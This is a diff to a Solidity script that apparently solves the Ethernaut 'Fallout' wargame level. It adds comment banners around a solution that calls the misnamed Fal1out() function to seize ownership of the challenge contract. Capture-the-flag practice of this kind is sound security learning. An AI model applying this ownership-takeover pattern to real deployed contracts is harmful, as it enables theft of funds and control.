@@ -18,8 +18,10 @@ contract FalloutSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // Ric Li C's Solution
-        // 1. Call Fal1out() function to make caller owner of the contract;
+        ////////////////////////////////////////////////////////////////////////////////////
+        // Start of Ric Li C's Solution
+        ////////////////////////////////////////////////////////////////////////////////////
+        // 1. Call `Fal1out()` function to make caller owner of the contract;
         Fallout challenge = Fallout(challengeInstance);
         challenge.Fal1out();
 
@@ -28,6 +30,9 @@ contract FalloutSolution is Script, EthernautHelper {
         // if contract `Fallout` is imported, below check will work.
         // address heroAddress = vm.addr(heroPrivateKey);
         // require(heroAddress == challenge.owner(), "Owner check failed");
+        ////////////////////////////////////////////////////////////////////////////////////
+        // End of Ric Li C's Solution
+        ////////////////////////////////////////////////////////////////////////////////////
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
